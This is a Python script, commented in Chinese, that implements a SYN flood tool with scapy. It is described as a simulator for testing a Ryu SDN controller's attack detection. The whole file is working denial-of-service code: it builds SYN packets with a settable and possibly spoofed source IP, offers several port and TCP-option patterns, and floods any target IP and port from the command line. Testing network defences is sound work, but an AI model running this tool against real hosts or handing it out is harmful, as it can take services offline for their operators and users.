#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SYN Flood 攻擊模擬器
用於測試Ryu控制器的攻擊檢測與防禦能力
"""

import argparse
import random
import socket
import struct
import sys
import time
from scapy.all import IP, TCP, send, RandShort, Raw

def create_syn_packet(src_ip, dst_ip, dst_port, attack_pattern='standard'):
    """
    創建SYN封包
    
    參數:
        src_ip: 源IP地址
        dst_ip: 目標IP地址
        dst_port: 目標端口
        attack_pattern: 攻擊模式 ('standard', 'fixed_port', 'sequence', 'aggressive')
    
    返回:
        構造的SYN封包
    """
    # 根據攻擊模式選擇不同的封包特徵
    if attack_pattern == 'fixed_port':
        # 使用固定源端口 - 更容易被檢測
        src_port = 12345
    elif attack_pattern == 'sequence':
        # 使用順序端口 - 明顯的模式
        # 全局變數用於跟踪端口序列
        if not hasattr(create_syn_packet, "last_port"):
            create_syn_packet.last_port = 10000
        create_syn_packet.last_port += 1
        if create_syn_packet.last_port > 60000:
            create_syn_packet.last_port = 10000
        src_port = create_syn_packet.last_port
    else:  # standard 或 aggressive
        # 隨機高位端口
        src_port = random.randint(1024, 65535)
    
    # 構造TCP選項 - 可以作為特徵
    if attack_pattern == 'aggressive':
        # 添加一些不常見的TCP選項組合
        tcp_options = [
            ('MSS', 1460),
            ('SAckOK', ''),
            ('Timestamp', (int(time.time()), 0)),
            ('NOP', None),
            ('WScale', 7),
            # 添加一些不常見的選項
            ('EOL', None),
        ]
    else:
        # 標準TCP選項
        tcp_options = [
            ('MSS', 1460),
            ('SAckOK', ''),
            ('Timestamp', (int(time.time()), 0)),
            ('NOP', None),
            ('WScale', 7)
        ]
    
    # 構造IP和TCP頭部
    packet = IP(src=src_ip, dst=dst_ip) / TCP(
        sport=src_port,
        dport=dst_port,
        flags="S",  # SYN標誌
        seq=random.randint(1000000000, 2000000000),  # 隨機序列號
        window=8192,  # 窗口大小
        options=tcp_options
    )
    
    # 對於aggressive模式，添加一些負載 (SYN通常沒有負載，這是異常的)
    if attack_pattern == 'aggressive':
        packet = packet / Raw(load="SYN-FLOOD-ATTACK-PAYLOAD")
    
    return packet

def run_syn_flood(src_ip, target_ip, target_port, count=1000, interval=0.01, attack_pattern='standard', burst_size=1):
    """
    執行SYN Flood攻擊
    
    參數:
        src_ip: 源IP地址 (可以是真實的或偽造的)
        target_ip: 目標IP地址
        target_port: 目標端口
        count: 發送的封包數量
        interval: 封包發送間隔(秒)
        attack_pattern: 攻擊模式 ('standard', 'fixed_port', 'sequence', 'aggressive')
        burst_size: 每次發送的封包數量
    """
    print(f"[*] 開始 SYN Flood 攻擊: {src_ip} -> {target_ip}:{target_port}")
    print(f"[*] 攻擊模式: {attack_pattern}, 發送 {count} 個SYN封包，間隔 {interval} 秒")
    
    # 構造並發送SYN封包
    packets_sent = 0
    while packets_sent < count:
        # 決定本次發送的封包數量
        current_burst = min(burst_size, count - packets_sent)
        
        # 創建並發送一批封包
        for _ in range(current_burst):
            # 創建封包
            packet = create_syn_packet(src_ip, target_ip, target_port, attack_pattern)
            
            try:
                # 發送封包
                send(packet, verbose=0)
                packets_sent += 1
                
                # 每發送10個封包輸出一次進度
                if packets_sent % 10 == 0:
                    sys.stdout.write(f"\r[*] 已發送 {packets_sent}/{count} 個封包")
                    sys.stdout.flush()
                
            except KeyboardInterrupt:
                print("\n[!] 用戶中斷，停止攻擊")
                return
            except Exception as e:
                print(f"\n[!] 封包發送錯誤: {e}")
        
        # 批次發送間隔
        if packets_sent < count:
            time.sleep(interval)
    
    print("\n[+] SYN Flood 攻擊完成")

def main():
    """主函數"""
    parser = argparse.ArgumentParser(description="SYN Flood 攻擊工具")
    parser.add_argument("--src", dest="src_ip", required=True,
                        help="源IP地址 (攻擊者IP)")
    parser.add_argument("--dst", dest="dst_ip", required=True,
                        help="目標IP地址")
    parser.add_argument("--port", dest="dst_port", type=int, default=80,
                        help="目標端口 (預設: 80)")
    parser.add_argument("--count", dest="count", type=int, default=1000,
                        help="發送的封包數量 (預設: 1000)")
    parser.add_argument("--interval", dest="interval", type=float, default=0.01,
                        help="封包發送間隔(秒) (預設: 0.01)")
    parser.add_argument("--pattern", dest="pattern", default="standard",
                        choices=["standard", "fixed_port", "sequence", "aggressive"],
                        help="攻擊模式 (預設: standard)")
    parser.add_argument("--burst", dest="burst_size", type=int, default=1,
                        help="每次發送的封包數量 (預設: 1)")
    
    args = parser.parse_args()
    
    # 執行攻擊
    run_syn_flood(
        args.src_ip, 
        args.dst_ip, 
        args.dst_port, 
        args.count, 
        args.interval,
        args.pattern,
        args.burst_size
    )

if __name__ == "__main__":
    main()
